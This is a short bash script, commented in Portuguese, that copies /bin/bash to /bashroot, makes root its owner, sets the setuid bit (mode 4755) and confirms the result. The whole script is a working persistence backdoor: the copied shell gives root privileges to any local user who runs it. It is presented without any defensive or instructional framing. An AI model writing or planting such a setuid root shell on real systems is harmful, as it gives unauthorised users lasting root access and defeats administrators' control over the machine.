#!/bin/bash

# Cria uma cópia do bash com permissões de root
cp /bin/bash /bashroot
chown root:root /bashroot
chmod 4755 /bashroot

# Verifica as permissões
ls -l /bashroot

echo "/bashroot configurado com setuid."
